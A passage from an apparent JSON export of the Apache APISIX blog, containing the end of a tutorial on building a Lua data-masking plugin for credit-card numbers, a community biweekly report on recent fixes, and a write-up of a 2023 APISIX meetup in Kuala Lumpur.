rules.\\n\\nCreating such a plugin in Lua might be trivial or daunting, depending on your level of expertise in APISIX+OpenResty+Nginx. So in this article, we will look at how you can create and run this plugin from the ground up while learning some basics of APISIX plugin development in Lua.\\n\\n## Setting Things Up\\n\\nYou can start with the template plugin from [apisix-plugin-template](https://github.com/api7/apisix-plugin-template). This contains [boilerplate code](https://github.com/api7/apisix-plugin-template/blob/main/apisix/plugins/demo.lua) for creating custom Lua plugins for APISIX.\\n\\nTo use the template, go to the repository and click \\"[Use this template](https://github.com/new?template_name=apisix-plugin-template&template_owner=api7).\\" You can then clone it to your local machine for modification.\\n\\nUnder the [apisix/plugins](https://github.com/api7/apisix-plugin-template/tree/main/apisix/plugins) directory, you will find a file named `demo.lua`. You can rename this to `data-mask.lua`. This will be the starting point for our custom plugin.\\n\\nInitially, the main parts of the file will look like this containing some boilerplate code which includes some imports and variable definitions:\\n\\n```lua {title=\\"data-mask.lua\\"}\\n-- local common libs\\nlocal require = require\\nlocal core    = require(\\"apisix.core\\")\\n\\n-- module define\\nlocal plugin_name = \\"data-mask\\"\\n\\n-- plugin schema\\nlocal plugin_schema = {\\n    type = \\"object\\",\\n    properties = {},\\n    required = {},\\n}\\n\\nlocal _M = {\\n    version  = 0.1,            -- plugin version\\n    priority = 0,              -- the priority of this plugin will be 0\\n    name     = plugin_name,    -- plugin name\\n    schema   = plugin_schema,  -- plugin schema\\n}\\n\\n\\n-- module interface for schema check\\n-- @param `conf` user defined conf data\\n-- @param `schema_type` defined in `apisix/core/schema.lua`\\n-- @return <boolean>\\nfunction _M.check_schema(conf, schema_type)\\n    return core.schema.check(plugin_schema, conf)\\nend\\n\\n\\n-- module interface for header_filter phase\\nfunction _M.header_filter(conf, ctx)\\n\\nend\\n\\n\\n-- module interface for body_filter phase\\nfunction _M.body_filter(conf, ctx)\\n\\nend\\n\\nreturn _M\\n```\\n\\nThere are three functions (interfaces for the plugin) declared on the structure `_M`:\\n\\n1. `check_schema`: used for validating the plugin configuration and is called when this plugin is enabled on a route.\\n2. `header_filter` and\\n3. `body_filter`: for modifying the response header and body, respectively, before sending it to the client.\\n\\nIn the end, this returns `_M`, and the APISIX can use the data from this to get the metadata and functions from the plugin.\\n\\n## Designing the Plugin\\n\\nLike every sound engineer, let\'s first design the plugin before we start writing code.\\n\\nThe goal of this plugin is simple:\\n\\n1. The user should be able to define what sensitive data would look like in the plugin configuration (maybe RegEx?).\\n2. They should be able to define what sensitive data should be replaced with (like\xa0`*******`).\\n3. APISIX should then modify requests and responses based on these configurations.\\n\\nSo each rule can contain a regular expression and a replacement string. This rule will be applied to the response, and the masked data will be returned to the client:\\n\\n```json\\n{\\n  \\"rules\\": [\\n    {\\n      \\"regex\\": \\".*\\",\\n      \\"replace\\": \\"******\\"\\n    },\\n    {\\n      \\"regex\\": \\".*\\",\\n      \\"replace\\": \\"**\\"\\n    }\\n  ]\\n}\\n```\\n\\nWe can now define the JSON schema to validate the plugin configuration. This can help avoid issues with improper plugin configurations during runtime:\\n\\n```lua\\nlocal plugin_schema = {\\n    type = \\"object\\",\\n    properties = {\\n        rules = {\\n            type = \\"array\\",\\n            items = {\\n                type = \\"object\\",\\n                properties = {\\n                    regex = {\\n                        type = \\"string\\",\\n                        minLength = 1,\\n                    },\\n                    replace = {\\n                        type = \\"string\\",\\n                    },\\n                },\\n                required = {\\n                    \\"regex\\",\\n                    \\"replace\\",\\n                },\\n                additionalProperties = false,\\n            },\\n            minItems = 1,\\n        },\\n    },\\n    required = {\\n        \\"rules\\",\\n    },\\n}\\n```\\n\\nThe `rules` here is an array of objects meaning you can have multiple rules for defining what sensitive data should look like and what it should be replaced with. Each object in the array contains two required string fields, `regex` and `replace`, just like we designed.\\n\\n## Let\'s Write Some Code!\\n\\nWe have now decided what the plugin\'s functionality would look like and added some JSON schema to validate the plugin\'s configuration.\\n\\nWe will first modify the `_M.header_filter` function, which is called before the response header is sent to the client. But why are we changing this? Isn\'t our plugin supposed to modify the response body?\\n\\nWell, yes. But when we modify the data in the response body (from `2378-4531-5789-1369` to `2378-\\\\***\\\\*-\\\\*\\\\***-1369`), the `Content-Length` header will no longer be accurate. This can cause the client to interpret that the data returned by the server is abnormal and fail to complete the request.\\n\\nSince we haven\'t modified the request body yet, we cannot calculate the new, accurate value for the `Content-Length` header.\xa0 So we need to delete this header value, modify the response body, recalculate the new header value, and set it to the response. To do this in a single sweep, APISIX provides the `core.response.clear_header_as_body_modified` function:\\n\\n```lua\\nfunction _M.header_filter(conf, ctx)\\n    core.response.clear_header_as_body_modified()\\nend\\n```\\n\\nWe can now work on modifying the response body to mask the data. To do this, we must modify the `_M.body_filter` function.\\n\\nSometimes, the upstream response will be sent in chunks (`Content-Encoding: chunked`), and the `body_filter` function will be called multiple times. Since each of these chunks are incomplete in itself, we need to cache the data passed each time and call the `body_filter` function only when all blocks are received and spliced together. And like before, APISIX provides a function, `core.response.hold_body_chunk` to handle this scenario:\\n\\n```lua\\nlocal body = core.response.hold_body_chunk(ctx)\\nif not body then\\n    return\\nend\\n```\\n\\nNow to mask the response data, we can use the `ngx.re.gsub` function, which takes in a regular expression and a replacement string and replaces matching strings with the replacement string.\\n\\nThe RegEx conforms to the PCRE specification. For example, when the expression is `(.*)-(.*)-(.*)-(.*)`, it will extract the four variables separated by `-`, and you can use `$1`, `$2`, `$3`, and `$4` in the replacement string to refer to the four variables:\\n\\n```lua\\nfor _, rule in ipairs(conf.rules) do\\n    body = ngx.re.gsub(body, rule.regex, rule.replace, \\"jo\\")\\nend\\n```\\n\\nFinally, to set this as the new response body, we will modify the value of `ngx.arg[1]` as mentioned in the [OpenResty docs](https://github.com/openresty/lua-nginx-module/#body_filter_by_lua_block). Once we set the value of `ngx.arg[2]` to `true`, APISIX will send the new response body to the client:\\n\\n```lua\\nngx.arg[1] = body\\nngx.arg[2] = true\\n```\\n\\nCombining all these, the `body_filter` function will look like this:\\n\\n```lua\\nfunction _M.body_filter(conf, ctx)\\n    local body = core.response.hold_body_chunk(ctx)\\n    if not body then\\n        return\\n    end\\n\\n    for _, rule in ipairs(conf.rules) do\\n        body = ngx.re.gsub(body, rule.regex, rule.replace, \\"jo\\")\\n    end\\n\\n    ngx.arg[1] = body\\n    ngx.arg[2] = true\\nend\\n```\\n\\nNow the only thing left to do is glue everything together. The entire plugin code will look like this:\\n\\n```lua\\n-- local common libs\\nlocal require     = require\\nlocal ipairs      = ipairs\\nlocal ngx_re_gsub = ngx.re.gsub\\nlocal core        = require(\\"apisix.core\\")\\n\\n-- module define\\nlocal plugin_name = \\"data-mask\\"\\n\\n-- plugin schema\\nlocal plugin_schema = {\\n    type = \\"object\\",\\n    properties = {\\n        rules = {\\n            type = \\"array\\",\\n            items = {\\n                type = \\"object\\",\\n                properties = {\\n                    regex = {\\n                        type = \\"string\\",\\n                        minLength = 1,\\n                    },\\n                    replace = {\\n                        type = \\"string\\",\\n                    },\\n                },\\n                required = {\\n                    \\"regex\\",\\n                    \\"replace\\",\\n                },\\n                additionalProperties = false,\\n            },\\n            minItems = 1,\\n        },\\n    },\\n    required = {\\n        \\"rules\\",\\n    },\\n}\\n\\nlocal _M = {\\n    version  = 0.1,            -- plugin version\\n    priority = 0,              -- the priority of this plugin will be 0\\n    name     = plugin_name,    -- plugin name\\n    schema   = plugin_schema,  -- plugin schema\\n}\\n\\n\\n-- module interface for schema check\\n-- @param `conf` user defined conf data\\n-- @param `schema_type` defined in `apisix/core/schema.lua`\\n-- @return <boolean>\\nfunction _M.check_schema(conf, schema_type)\\n    return core.schema.check(plugin_schema, conf)\\nend\\n\\n\\n-- module interface for header_filter phase\\nfunction _M.header_filter(conf, ctx)\\n    core.response.clear_header_as_body_modified()\\nend\\n\\n\\n-- module interface for body_filter phase\\nfunction _M.body_filter(conf, ctx)\\n    local body = core.response.hold_body_chunk(ctx)\\n    if not body then\\n        return\\n    end\\n\\n    for _, rule in ipairs(conf.rules) do\\n        body = ngx_re_gsub(body, rule.regex, rule.replace, \\"jo\\")\\n    end\\n\\n    ngx.arg[1] = body\\n    ngx.arg[2] = true\\nend\\n\\nreturn _M\\n```\\n\\n## Testing the Plugin\\n\\nLet\'s assume our upstream will return a response like this:\\n\\n```json\\n{\\n  \\"username\\": \\"jack\\",\\n  \\"credit_number\\": \\"2378-4531-5789-1369\\"\\n}\\n```\\n\\nIt contains the username and the credit card number, which is far from ideal. We can use the `data-mask` plugin to rewrite it to `2378-****-****-1369`. The configuration would look like this:\\n\\n```json\\n{\\n  \\"rules\\": [\\n    {\\n      \\"regex\\": \\"\\\\\\"credit_number\\\\\\":\\\\\\"(.*)-(.*)-(.*)-(.*)\\\\\\"\\",\\n      \\"replace\\": \\"\\\\\\"credit_number\\\\\\":\\\\\\"$1-****-****-$4\\\\\\"\\"\\n    }\\n  ]\\n}\\n```\\n\\nA common way the APISIX plugin developers debug plugins by mocking upstream response is through the [serverless-pre-function](https://apisix.apache.org/docs/apisix/plugins/serverless/) plugin. Through this plugin, you can run custom Lua code, in our case, to send back a response with un-masked credit card numbers:\\n\\n```lua\\nreturn function()\\n    ngx.header[\\"Content-Type\\"] = \\"application/json\\";\\n    require(\\"apisix.core\\").response.exit(200, {\\n        credit_number = \\"1234-5678-8765-4321\\",\\n        username = \\"jack\\"\\n    })\\nend\\n```\\n\\nWe can configure both our custom plugin and the `serverless-pre-function` plugin on the same route as shown below:\\n\\n```shell\\ncurl -X PUT \'http://localhost:9180/apisix/admin/routes/data-mask\' \\\\\\n-H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' \\\\\\n-H \'Content-Type: application/json\' \\\\\\n--data \'{\\n    \\"uri\\": \\"/data-mask\\",\\n    \\"plugins\\": {\\n        \\"serverless-pre-function\\": {\\n            \\"phase\\": \\"access\\",\\n            \\"functions\\": [\\n                \\"return function() ngx.header[\\\\\\"Content-Type\\\\\\"] = \\\\\\"application/json\\\\\\"; require(\\\\\\"apisix.core\\\\\\").response.exit(200, {credit_number = \\\\\\"1234-5678-8765-4321\\\\\\", username = \\\\\\"jack\\\\\\"}) end\\"\\n            ]\\n        },\\n        \\"data-mask\\": {\\n            \\"rules\\": [\\n                {\\n                    \\"regex\\":\\"\\\\\\"credit_number\\\\\\":\\\\\\"(.*)-(.*)-(.*)-(.*)\\\\\\"\\",\\n                    \\"replace\\": \\"\\\\\\"credit_number\\\\\\":\\\\\\"$1-****-****-$4\\\\\\"\\"\\n                }\\n            ]\\n        }\\n    }\\n}\'\\n```\\n\\nNow if you send a request to the route, you will get back the masked credit card numbers in the response:\\n\\n```shell\\ncurl -X GET \'http://localhost:9080/data-mask\'\\n\\n{\\n  \\"username\\": \\"jack\\",\\n  \\"credit_number\\": \\"1234-****-****-4321\\"\\n}\\n```\\n\\n## Using in Production\\n\\nYou can directly build your own APISIX image with this plugin included for using it in production:\\n\\n```dockerfile\\nFROM apache/apisix:3.3.0-debian\\n\\nCOPY ./data-mask.lua /usr/local/apisix/apisix/plugins/data-mask.lua\\n```\\n\\nThen run `docker build`:\\n\\n```shell\\ndocker build -t your-own-registry.com/apisix:3.3.0-data-mask .\\n```\\n\\nNext, in the configuration file (`config.yaml`) you can add your plugin to the list:\\n\\n```yaml\\nplugins:\\n  # any other plugins from config-default.yaml\\n  - xxxx\\n  - data-mask\\n```\\n\\nNote: The values in `plugins` in the `config.yaml` file override those in the `config-default.yaml` file. If you want to use other plugins, copy it to the `config.yaml` file.\\n\\nOnce you add it to the configuration file, you should be able to use the plugin on your routes.\\n\\n## Learn More\\n\\nAll the sample code from this article can be found [here](https://github.com/bzp2010/apisix-plugin-data-mask/blob/main/apisix/plugins/data-mask.lua). You can also use the [plugin template](https://github.com/api7/apisix-plugin-template) to create your own plugins easily.\\n\\nAPISIX comes with many in-built plugins; you can refer to its [source code](https://github.com/apache/apisix/tree/master/apisix/plugins) for more details on how you can create your own plugins. You can also refer to the [lua-nginx-module](https://github.com/openresty/lua-nginx-module) and this [series of OpenResty tutorials](https://api7.ai/learning-center/openresty) to learn more."},{"id":"Biweekly Report (July 03 - July 16)","metadata":{"permalink":"/blog/2023/07/18/weekly-report","source":"@site/blog/2023/07/18/weekly-report.md","title":"Biweekly Report (July 03 - July 16)","description":"The Apache APISIX Community Biweekly Report can help community members better grasp the progress of the Apache APISIX community so that everyone can participate in the Apache APISIX community.","date":"2023-07-18T00:00:00.000Z","formattedDate":"July 18, 2023","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":2.595,"truncated":true,"authors":[],"prevItem":{"title":"Creating a Custom Data Mask Plugin","permalink":"/blog/2023/07/20/data-mask-plugin"},"nextItem":{"title":"Accelerating API Gateway Excellence: Apache APISIX Community Meetup in Malaysia","permalink":"/blog/2023/07/11/2023-apisix-meetup-malaysia"}},"content":"> We have recently fixed and improved some features of Apache APISIX, including updates to the mock plugin which now supports adding headers, resolution of an error in the limit-count plugin when using the http variable in stream mode, fixing a cache key conflict issue in the etcd watch implementation, and the addition of a new feature to the admin API that allows forceful deletion of resources using the \\"force\\" parameter. Meanwhile, We are pleased to present Apache APISIX 3.4.0 with exciting new features and performance improvements. For more details, please read this biweekly report.\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nApache APISIX grew up as a community from the first day it was open-sourced, and quickly became the most active open-source API gateway project in the world. These achievements are inseparable from the joint efforts of community partners.\\n\\nFrom 7.03 to 7.16, 21 contributors submitted 45 commits for Apache APISIX. Thank you for your contributions to Apache APISIX.\\n\\nWe have recently fixed and improved some features, and the summary of the updates is as follows:\\n\\n1. The mock plugin now supports adding headers.\\n\\n2. Fixed an issue in the limit-count plugin where using the http variable in stream mode caused errors.\\n\\n3. Fixed a cache key conflict issue in the etcd watch implementation.\\n\\n4. Added a new feature to the admin API that allows forceful deletion of resources using the \\"force\\" parameter.\\n\\n\\"If you want to go fast, go alone. If you want to go far, go together.\\" The Apache APISIX Community Biweekly Report can help community members better grasp the progress of the Apache APISIX community so that everyone can participate in the Apache APISIX community.\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.apiseven.com/uploads/2023/07/19/a5J3z3cg_%E6%89%80%E6%9C%89%E8%B4%A1%E7%8C%AE%E8%80%85.png)\\n\\n![Apache APISIX New Contributors](https://static.apiseven.com/uploads/2023/07/19/y2VSsYjg_contributor0719.png)\\n\\n## Highlights of Recent Features\\n\\n### Apache APISIX\\n\\n- [Mock plugin now supports adding headers](https://github.com/apache/apisix/pull/9720) (Contributor: [shreemaan-abhishek](https://github.com/shreemaan-abhishek))\\n\\n- [Fixed the issue of using the http variable in stream mode causing errors in the limit-count plugin](https://github.com/apache/apisix/pull/9816) (Contributor: [Sn0rt](https://github.com/Sn0rt))\\n\\n- [Fixed the conflict issue of update_count in etcd watch implementation](https://github.com/apache/apisix/pull/9811) (Contributor: [kingluo](https://github.com/kingluo))\\n\\n- [Added the ability to force delete resources through the admin API](https://github.com/apache/apisix/pull/9810) (Contributor: [lingsamuel](https://github.com/lingsamuel))\\n\\n## Recent Blog Recommendations\\n\\n- [Accelerating API Gateway Excellence: Apache APISIX Community Meetup in Malaysia](https://apisix.apache.org/blog/2023/07/11/2023-apisix-meetup-malaysia/)\\n  \\n  Kuala Lumpur, the capital of Malaysia, witnessed the success of the 2023 APISIX open-source Community Meetup on July 4th.\\n\\n- [Release Apache APISIX 3.4.0](https://apisix.apache.org/blog/2023/06/30/release-apache-apisix-3.4.0/)\\n\\n  This release provides a new plugin loki-logger to forward logs to Grafana Loki, and allows for mTLS connection on the route level. In addition, the release also includes many other updates to continuously enhance the user experience of APISIX.\\n\\n- [Connecting IoT Devices to the Cloud with APISIX MQTT Proxy](https://apisix.apache.org/blog/2023/06/30/apisix-mqtt-proxy/)\\n\\n  APISIX\'s support for stream routes and, in extension, the MQTT protocol is often overlooked. Let\'s change this by looking at an end-to-end example of how APISIX can act as an MQTT proxy.\\n\\nA wealth of documentation tutorials and experience has been accumulated on the Apache APISIX official website and GitHub. If you encounter problems, you can look into the documentation, search keywords in the issues, or participate in the discussion on the issues, proposing your own ideas and practical experience."},{"id":"Accelerating API Gateway Excellence: Apache APISIX Community Meetup in Malaysia","metadata":{"permalink":"/blog/2023/07/11/2023-apisix-meetup-malaysia","source":"@site/blog/2023/07/11/2023-apisix-meetup-malaysia.md","title":"Accelerating API Gateway Excellence: Apache APISIX Community Meetup in Malaysia","description":"Kuala Lumpur, the capital of Malaysia, witnessed the success of the 2023 APISIX open-source Community Meetup on July 4th.","date":"2023-07-11T00:00:00.000Z","formattedDate":"July 11, 2023","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":10.875,"truncated":true,"authors":[{"name":"Yilia Lin","title":"Author","url":"https://github.com/Yilialinn","image_url":"https://avatars.githubusercontent.com/u/114121331?v=4","imageURL":"https://avatars.githubusercontent.com/u/114121331?v=4"}],"prevItem":{"title":"Biweekly Report (July 03 - July 16)","permalink":"/blog/2023/07/18/weekly-report"},"nextItem":{"title":"How to Use Vault to Manage Certificates in APISIX","permalink":"/blog/2023/07/09/apisix-integrates-with-vault"}},"content":"Kuala Lumpur, the capital of Malaysia, witnessed the success of the 2023 APISIX open-source Community Meetup on July 4th.\\n\\n\x3c!--truncate--\x3e\\n\\nKuala Lumpur, the vibrant capital of Malaysia, recently witnessed the grand opening of the highly anticipated technical extravaganza hosted by [Apache APISIX](https://apisix.apache.org/). This momentous event, brought to life through the collaboration of [API7.ai (API7)](https://api7.ai/), [N2N Connect Berhad (N2N)](https://www.n2nconnect.com/), and [Advanced Micro Devices, Inc. (AMD)](https://www.amd.com/en.html), saw the convergence of numerous API gateway technology experts and enthusiasts. The impact of APISIX resonates across multiple sectors, including finance and IT, attracting users from Malaysia and Singapore, who enthusiastically joined both on-site and online.\\n\\nDistinguished by the presence of [APISIX PMC members](https://apisix.apache.org/team/) and a diverse array of contributors, the gathering served as a forum for discussing cutting-edge advancements and evolving trends in API gateway technology. The event proved invaluable for the exchange of experiences, insights, and practical knowledge, fostering an atmosphere brimming with warmth and intellectual synergy. Through this dynamic meetup, the development of API gateway technology received a rejuvenating boost, nourished by fresh wisdom and innovative ideas.\\n\\n## The Voice of the Audience\\n\\nThe meetup garnered widespread acclaim, captivating attendees with its engaging program and fostering a spirit of knowledge exchange. Notably, Bryan, the esteemed Business Development Manager of N2N, the foremost stock trading platform in Malaysia, shared his insights:\\n\\n> \\"In Malaysia\'s developer community, there has been a recurring challenge where most individuals learn development skills online but struggle to find local connections with other developers. Consequently, this has led to a shift in how ideas are shared, particularly when facing real-life development challenges.\\n>\\n> For example, while online learning is great for acquiring new programming languages, it falls short when it comes to addressing specific situations like making decisions on system architecture within the business landscape. These are instances where direct conversations with peers become essential. I strongly emphasize the importance of collaborative work for everyone\'s growth.\\n>\\n> Furthermore, I firmly believe that the open-source community plays a significant role in the lives of software developers. Projects like APISIX within the [Apache Software Foundation](https://www.apache.org/) are invaluable. That\'s why N2N is wholeheartedly supportive of open-source initiatives, including those led by the Apache Software Foundation. We are also enthusiastic about supporting any future open-source projects, non-profit or otherwise, as well as participating in open-source meetups.\\n>\\n> Speaking specifically about APISIX, we see a promising future for the product overall. We are genuinely excited and confident that it will excel, especially considering the positive feedback we received from attendees at this event. Additionally, the global interest from clients eager to utilize APISIX further strengthens our belief that the technological landscape in Malaysia will continue to thrive. We are truly delighted to have had the opportunity to connect with you all and eagerly await your future endeavors.\\"\\n\\nMichael, Head of SRE at a multinational fintech company, said:\\n\\n> \\"We are actively seeking a new API gateway, and we have a keen interest in APISIX\'s exceptional traffic governance capabilities. The valuable insights and use cases presented at the conference, particularly within the financial services industry, provide invaluable references for our decision-making process. We eagerly look forward to experiencing the captivating features of APISIX at the earliest opportunity.\\"\\n\\nJoey, an accomplished Software Engineer, enthusiastically praised the Meetup:\\n\\n> \\"The event is incredibly informative, with a remarkably detailed demo that left me enriched with knowledge. Prior to this, he was more familiar with platforms such as GCP and AWS, but the introduction to APISIX has opened up a plethora of prospects for my future work.\\"\\n\\n## Ming Wen: APISIX - Past, Present, and Future\\n\\n> [Ming Wen](https://www.linkedin.com/in/ming-wen-api7/), Apache APISIX PMC Chair, member of Apache Software Foundation, member of Kubernetes, and co-founder and CEO of API7.ai\\n\\n![Ming Wen](https://static.apiseven.com/uploads/2023/07/07/wv8WK1TY_meetup1.jpeg)\\n\\nMing kicked off the session by sharing the inspiring story behind the birth of APISIX. Driven by their shared love for coding and a common goal to take on challenging endeavors, Ming and Yuansheng dedicated themselves to the startup journey. They spent countless hours in a cramped small room, immersed in writing code, and ultimately brought APISIX to life.\\n\\nWith a vision to foster global collaboration and knowledge sharing among developers, they made the significant decision to donate APISIX to the Apache Software Foundation. Since then, APISIX has thrived under the guiding principle of \\"Community over Code.\\" It treats contributors as valued partners, which has attracted exceptional developers from around the world to join and contribute to the APISIX project.\\n\\nOver the course of four years, APISIX has built an active and vibrant [community](https://apisix.apache.org/blog/tags/community/), becoming a driving force behind its vitality. The community\'s responsiveness has been remarkable, swiftly addressing APISIX issues in a short period of time. This continuous growth and engagement continually attract new members, infusing APISIX with fresh perspectives and energy.\\n\\n![Time of Issues Responded](https://static.apiseven.com/uploads/2023/07/07/FGcdrAPT_2.png)\\n\\nAPISIX has gained users across the globe, with hundreds of enterprise users representing various industries such as finance, internet, manufacturing, retail, and operators. Prominent companies like [iQIYI](https://api7.ai/blog/iqiyi-api-gateway-update-and-deployment-based-on-apache-apisix), [Airwallex](https://api7.ai/blog/how-airwallex-empowers-global-payment-through-apache-apisix), [Zoom](https://api7.ai/blog/zoom-uses-apisix-ingress), and the [Amber Group](https://api7.ai/blog/amber-api-gateway-architecture) rely on APISIX to handle their critical business traffic, serving millions of users worldwide.\\n\\nLooking ahead, APISIX is committed to embracing AI advancements. In fact, as early as October 2022, [APISIX introduced its AI module](https://github.com/apache/apisix/pull/8102/files), paving the way for a more intelligent API management experience. This innovation empowers developers to navigate increasingly complex business scenarios with greater efficiency and effectiveness.\\n\\nFurthermore, APISIX aims to streamline API design processes and provide developers with more efficient tools and support. Simultaneously, it endeavors to assist management in making informed decisions by delivering comprehensive insights. These initiatives will unlock added value for developers and enterprises alike, propelling the entire industry toward a more intelligent and efficient future.\\n\\n## Yuansheng Wang: How Do Financial Services Companies Use APISIX?\\n\\n> [Yuansheng Wang](https://www.linkedin.com/in/yuansheng-wang-84014022a/), member of Apache APISIX PMC, co-founder and CTO of API7.ai, one of the authors of *Apache APISIX in Action*\\n\\n![Yuansheng (right) is discussing technical details with the audience](https://static.apiseven.com/uploads/2023/07/07/3kshxsgx_3.jpeg)\\n\\nAPI connects the \\"traffic\\" of the digital world, and APISIX is the core tool on the \\"traffic route\\". In modern architecture, APISIX plays a pivotal role in the full lifecycle management of APIs. This innovative API management platform brings more efficient and smarter API management solutions to developers and enterprises.\\n\\nAPISIX has won the favor of many financial company users, including [Airwallex](https://api7.ai/blog/how-airwallex-empowers-global-payment-through-apache-apisix), [Essence Securities](https://api7.ai/blog/essence-securities-selects-apisix), GF Securities, [Amber Group](https://api7.ai/blog/amber-api-gateway-architecture), [Snowball Finance](https://api7.ai/blog/snowball-finance-with-apisix), and so on. These enterprises are well aware of the importance of APIs in digital transformation and have obtained a more efficient, secure, and intelligent API management experience through APISIX. The achievements of APISIX not only demonstrate its importance in the process of digital transformation but also provide new ideas and directions for the entire industry. [API7](https://api7.ai/) provides deeper [enterprise-level product](https://api7.ai/enterprise)s on the basis of APISIX.\\n\\n### Airwallex\\n\\n[Airwallex](https://api7.ai/blog/how-airwallex-empowers-global-payment-through-apache-apisix), a global financial technology company, faces significant challenges in data governance and internal system management as its business expands worldwide. The complexity of interconnecting systems poses intricate challenges, where issues in one system can disrupt the normal operation of others. To address these problems, Airwallex seeks a highly stable, reliable, and available API gateway with low latency, high performance, and support for custom plugins such as user-based routing and rate limiting. APISIX fulfills these requirements and helps Airwallex overcome data sovereignty challenges while efficiently supporting its business operations across 130 countries and regions, covering more than 50 currencies.\\n\\n### Essence Securities\\n\\n[Essence Securities](https://api7.ai/blog/essence-securities-selects-apisix), on the other hand, faced complexities due to their relatively complex original technology stack, including NGINX, Spring Cloud Gateway, and self-developed systems. This decentralized architecture resulted in issues related to system management and duplication of efforts, leading to increased development costs. By integrating APISIX into Essence Securities\' business system, they gained access to a high-performance API gateway with horizontal scaling capabilities. APISIX offers powerful traffic management, security features, protocol translation, authentication and authorization, and more. This integration enhanced traffic governance, significantly improved research and development efficiency, and ensured data security and access management. APISIX has become an essential component for Essence Securities\' cloud-native development, enabling them to manage and develop their business more efficiently.\\n\\nFor more user cases, please refer to [https://api7.ai/category/usercase](https://api7.ai/category/usercase).\\n\\n## Bobur: Dynamic, User Credentials-based Routing\\n\\n> [Bobur Umurzokov](https://www.linkedin.com/in/boburumurzokov/), Apache APISIX Developer Advocate, API7 Developer Advocate\\n\\nBy leveraging an API Gateway, users can effectively route traffic to different backend services based on various criteria. Bobur provides a demonstration that explains the implementation of dynamic routing, which considers user attributes specified in request headers, request queries, or request bodies.\\n\\nTo gain more insight into Bobur\'s demonstration and explore the details further, you can refer to [his article](https://api7.ai/blog/dynamic-routing-based-on-user-credentials)\\n\\n![Bobur is demonstrating how to route traffic](https://static.apiseven.com/uploads/2023/07/07/AoFBgxlM_meetup5.png)\\n\\n## Chao Zhang: Elevating Apache APISIX to the Cloud\\n\\n> [Chao Zhang](https://www.linkedin.com/in/chao-zhang-52a106107/), member of Apache APISIX PMC, open source enthusiast, and contributor to projects such as OpenResty, Kubernetes Ingress-NGINX, and Kubernetes Gateway API\\n\\n![Chao Zhang](https://static.apiseven.com/uploads/2023/07/07/V4FYhaOD_6.jpeg)\\n\\nToday, the adoption of cloud services by companies is on the rise, and IT professionals are increasingly exploring cloud technology stacks and obtaining certifications. Cloud infrastructure, including Software-as-a-Service (SaaS), has become the preferred option for enterprises and individuals to undergo digital transformation, experiencing rapid growth in popularity.\\n\\nHowever, the emergence of multi-cloud and hybrid-cloud scenarios presents a significant challenge in terms of unified management API usage. To address this challenge, [API7 Cloud](https://api7.ai/cloud) was developed as a solution, specifically designed to assist enterprises in overcoming problems encountered in multi-cloud and hybrid-cloud environments.\\n\\nBuilt on the foundation of Apache APISIX, API7 Cloud leverages the functionalities provided by Apache APISIX, with the goal of simplifying and enhancing the configuration and usage of APISIX for users. It extends the capabilities of open-source APISIX by introducing more enterprise customizations, such as strengthening dynamic capabilities and supporting dynamic service discovery. Moreover, API7 Cloud offers an open API and an SDK, enabling automated API management and facilitating program integration for automation purposes.\\n\\nIn comparison to local devices, API7 Cloud offers heightened security, improved scalability, and reduced maintenance and update costs. While API7 Cloud hosts the control plane, the data plane of the API Gateway can be deployed anywhere, on any infrastructure. This flexibility allows users to manage their APIs more effectively. Additionally, API7 Cloud includes built-in observability, empowering users with clear insights into the usage and performance of their APIs.\\n\\n![Built-in Observability Support of API7](https://static.apiseven.com/uploads/2023/07/07/KE26wb3m_7.png)\\n\\n## Nicolas: Data Residency Management\\n\\n> [Nicolas Fr\xe4nkel](https://www.linkedin.com/in/nicolasfrankel/), Engineer, APISIX Developer Advocate, API7 Developer Advocate\\n\\n![Nicolas Fr\xe4nkel](https://static.apiseven.com/uploads/2023/07/07/YYJ9lHsQ_a5592a72-fb7d-4841-bbb6-ae29235bb569.jpeg)\\n\\nData residency poses significant concerns due to varying laws and regulations related to data storage and processing across different countries and regions. Additionally, cloud providers may not have data centers in specific locations, leading to the need for effective data residency management strategies.\\n\\nTo address this issue, Nicolas presented four methods: managing data residency in the code, library/framework, agent, and gateway layers. These approaches provide effective ways to manage data while ensuring compliance with diverse laws and regulations in different countries and regions, ultimately safeguarding user privacy and data security.\\n\\nDuring the live demonstration, Nicolas vividly showcased the operational processes and the impact of these methods on the participants. This demonstration helped everyone gain a better understanding of how to manage data residency challenges in various scenarios.\\n\\nDuring the event, [Koh Lian Chong](https://www.linkedin.com/in/koh-lian-chong-2b1713/?originalSubdomain=sg), ASEAN Business Director at AMD, captivated the audience with a compelling presentation on AMD\'s role in empowering global data centers. He provided a comprehensive overview of AMD\'s history and its cutting-edge product portfolio. In parallel, [Kiran Chavala](https://www.linkedin.com/in/kiran-chavala-1bb6a97/), Quality Assurance Engineer from ShapeBlue, introduced Apache CloudStack - a remarkable open-source cloud computing platform renowned for its exceptional scalability and high availability, which can significantly enhance development efficiency when combined with APISIX.\\n\\n## A Glimpse into Tomorrow\\n\\nMany financial technology companies in Malaysia are utilizing APISIX due to its exceptional performance and user-friendly features. [APISIX](https://github.com/apache/apisix-website) is renowned for its lightweight nature, ease of management, and seamless usability. It can efficiently operate on a single server and effortlessly handle billions of traffic when deployed across multiple servers. Furthermore, APISIX boasts quick installation and boot-up times. Notably, a prominent multinational conglomerate in Malaysia relies on APISIX for payment processing, and numerous fintech companies prefer APISIX as their go-to payment gateway.\\n\\n![2023 APISIX Meetup Malaysia](https://static.apiseven.com/uploads/2023/07/07/YFHhI10g_meetup10.jpeg)\\n\\nWe would like to express our sincere gratitude to all the speakers, participants, and organizers for their invaluable support, which contributed to the resounding success of the Apache APISIX meetup in Malaysia. It is because of your active participation that this event was made possible, and we extend our deepest appreciation to each and every one of you.\\n\\nLooking ahead, we eagerly anticipate future events like this, where we can continue to witness the innovative advancements and progress brought forth by our vibrant community. If you were unable to attend this meetup, there\'s no need to worry! You can stay updated by following Apache APISIX on social media or by attending upcoming events.\\n\\nStay tuned for further updates and announcements, and join us in shaping the future of API Gateway technology with Apache APISIX! Whether you are a novice or an experienced professional, we wholeheartedly welcome you to join us in exploring the boundless possibilities offered by [Apache APISIX](https://apisix.apache.org/)."},{"id":"How to Use Vault to Manage Certificates in 